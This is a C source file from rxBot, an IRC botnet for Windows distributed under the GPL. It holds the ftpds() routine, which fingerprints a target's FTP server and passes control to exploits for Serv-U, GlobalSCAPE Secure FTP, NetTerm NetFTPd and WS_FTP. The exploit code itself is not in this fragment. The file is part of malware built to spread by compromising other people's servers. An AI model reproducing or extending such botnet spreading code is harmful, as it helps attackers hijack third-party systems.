/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_FTPDS

bool ftpds(EXINFO exinfo) {
	int iHostFTP=AdvFTPdScannerCheckHead(exinfo);
	if(iHostFTP == FTP_TYPE_SERVU_3X || iHostFTP == FTP_TYPE_SERVU_4X || iHostFTP == FTP_TYPE_SERVU_5X) 
		return servuftpd(exinfo);
	if (iHostFTP == FTP_TYPE_GLOBALSCAPE_SECURE_3X || iHostFTP == FTP_TYPE_GLOBALSCAPE_SECURE_XX)
		return gssecureftpd(exinfo);
	if (iHostFTP == FTP_TYPE_NET_TERM)
		return netterm_netftpd(exinfo);
	if (iHostFTP == FTP_TYPE_WSFTP_503) 
		return ws_ftp(exinfo);

	return false;
}

#endif